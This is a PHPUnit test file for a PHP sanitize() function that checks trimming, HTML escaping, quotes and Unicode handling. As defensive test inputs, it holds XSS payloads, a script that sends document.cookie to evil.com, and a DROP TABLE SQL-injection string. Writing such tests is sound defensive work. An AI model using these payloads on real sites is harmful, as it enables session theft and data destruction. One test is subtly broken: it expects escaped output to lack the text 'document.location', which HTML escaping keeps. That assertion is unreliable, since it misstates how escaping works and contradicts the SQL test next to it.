<?php

declare(strict_types=1);

namespace Tests;

use PHPUnit\Framework\TestCase;

/**
 * Unit tests for sanitization and security functions.
 */
class SanitizationTest extends TestCase
{
    private string $projectRoot;

    protected function setUp(): void
    {
        $this->projectRoot = dirname(__DIR__);
        
        // Load the sanitize function from utilities
        require_once $this->projectRoot . '/src/Utilities.php';
    }

    // ── Basic Sanitization ─────────────────────────────────────

    public function testSanitizeBasicString(): void
    {
        $result = sanitize('Hello World');
        $this->assertSame('Hello World', $result);
    }

    public function testSanitizeTrimsWhitespace(): void
    {
        $result = sanitize('  Hello World  ');
        $this->assertSame('Hello World', $result);
    }

    public function testSanitizeTrimsNewlines(): void
    {
        $result = sanitize("\nHello\n");
        $this->assertSame('Hello', $result);
    }

    public function testSanitizeTrimsTabsAndSpaces(): void
    {
        $result = sanitize("\t  Hello  \t");
        $this->assertSame('Hello', $result);
    }

    // ── XSS Prevention ─────────────────────────────────────────

    public function testSanitizeEscapesScriptTags(): void
    {
        $result = sanitize('<script>alert("xss")</script>');
        $this->assertSame('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;', $result);
    }

    public function testSanitizeEscapesHtmlTags(): void
    {
        $result = sanitize('<div>content</div>');
        $this->assertSame('&lt;div&gt;content&lt;/div&gt;', $result);
    }

    public function testSanitizeEscapesImgTags(): void
    {
        $result = sanitize('<img src=x onerror=alert(1)>');
        $this->assertSame('&lt;img src=x onerror=alert(1)&gt;', $result);
    }

    public function testSanitizeEscapesStyleTags(): void
    {
        $result = sanitize('<style>body{background:red}</style>');
        $this->assertStringContainsString('&lt;style&gt;', $result);
    }

    public function testSanitizeEscapesIframeTags(): void
    {
        $result = sanitize('<iframe src="evil.com"></iframe>');
        $this->assertStringContainsString('&lt;iframe', $result);
    }

    public function testSanitizeEscapesJavascriptProtocol(): void
    {
        $result = sanitize('<a href="javascript:alert(1)">Click</a>');
        $this->assertStringContainsString('&lt;a', $result);
    }

    public function testSanitizeEscapesEventHandlers(): void
    {
        $result = sanitize('<button onclick="alert(1)">Click</button>');
        $this->assertStringContainsString('&lt;button', $result);
    }

    // ── Quote Handling ─────────────────────────────────────────

    public function testSanitizeEscapesSingleQuotes(): void
    {
        $result = sanitize("It's a test");
        $this->assertStringContainsString('&#039;', $result);
    }

    public function testSanitizeEscapesDoubleQuotes(): void
    {
        $result = sanitize('Say "Hello"');
        $this->assertSame('Say &quot;Hello&quot;', $result);
    }

    public function testSanitizeHandlesMixedQuotes(): void
    {
        $result = sanitize('He said "It\'s fine"');
        $this->assertStringContainsString('&quot;', $result);
        $this->assertStringContainsString('&#039;', $result);
    }

    // ── Special Characters ─────────────────────────────────────

    public function testSanitizeEscapesAmpersand(): void
    {
        $result = sanitize('AT&T');
        $this->assertSame('AT&amp;T', $result);
    }

    public function testSanitizeEscapesLessThan(): void
    {
        $result = sanitize('5 < 10');
        $this->assertSame('5 &lt; 10', $result);
    }

    public function testSanitizeEscapesGreaterThan(): void
    {
        $result = sanitize('10 > 5');
        $this->assertSame('10 &gt; 5', $result);
    }

    public function testSanitizeHandlesMultipleSpecialChars(): void
    {
        $result = sanitize('Price: $299 & "free" shipping <special>');
        $this->assertStringContainsString('&amp;', $result);
        $this->assertStringContainsString('&quot;', $result);
        $this->assertStringContainsString('&lt;', $result);
        $this->assertStringContainsString('&gt;', $result);
    }

    // ── Unicode & Encoding ─────────────────────────────────────

    public function testSanitizeHandlesUtf8(): void
    {
        $result = sanitize('Café ☕');
        $this->assertStringContainsString('Café', $result);
        $this->assertStringContainsString('☕', $result);
    }

    public function testSanitizeHandlesEmoji(): void
    {
        $result = sanitize('iPhone 📱');
        $this->assertStringContainsString('📱', $result);
    }

    public function testSanitizeHandlesAccentedCharacters(): void
    {
        $result = sanitize('Naïve résumé');
        $this->assertStringContainsString('Naïve', $result);
        $this->assertStringContainsString('résumé', $result);
    }

    // ── Edge Cases ─────────────────────────────────────────────

    public function testSanitizeEmptyString(): void
    {
        $result = sanitize('');
        $this->assertSame('', $result);
    }

    public function testSanitizeWhitespaceOnly(): void
    {
        $result = sanitize('   ');
        $this->assertSame('', $result);
    }

    public function testSanitizeNull(): void
    {
        $this->expectException(\TypeError::class);
        sanitize(null);
    }

    public function testSanitizeNumericString(): void
    {
        $result = sanitize('12345');
        $this->assertSame('12345', $result);
    }

    public function testSanitizePriceFormat(): void
    {
        $result = sanitize('$299.99');
        $this->assertSame('$299.99', $result);
    }

    public function testSanitizePhoneNumber(): void
    {
        $result = sanitize('352-575-0438');
        $this->assertSame('352-575-0438', $result);
    }

    // ── Real-World Scenarios ───────────────────────────────────

    public function testSanitizeProductName(): void
    {
        $result = sanitize('Apple iPhone 14 Pro Max');
        $this->assertSame('Apple iPhone 14 Pro Max', $result);
    }

    public function testSanitizeCarrierName(): void
    {
        $result = sanitize('AT&T');
        $this->assertSame('AT&amp;T', $result);
    }

    public function testSanitizeConditionDescription(): void
    {
        $result = sanitize('Excellent - Like New!');
        $this->assertSame('Excellent - Like New!', $result);
    }

    public function testSanitizeMaliciousInput(): void
    {
        $malicious = '<script>document.location="http://evil.com?cookie="+document.cookie</script>';
        $result = sanitize($malicious);
        
        // Should not contain executable script
        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringNotContainsString('document.location', $result);
        
        // Should be properly escaped
        $this->assertStringContainsString('&lt;script&gt;', $result);
    }

    public function testSanitizeSqlInjectionAttempt(): void
    {
        $sqlInjection = "'; DROP TABLE users; --";
        $result = sanitize($sqlInjection);
        
        // Should escape quotes
        $this->assertStringContainsString('&#039;', $result);
        
        // The rest should remain (sanitize is for HTML, not SQL)
        $this->assertStringContainsString('DROP TABLE', $result);
    }
}
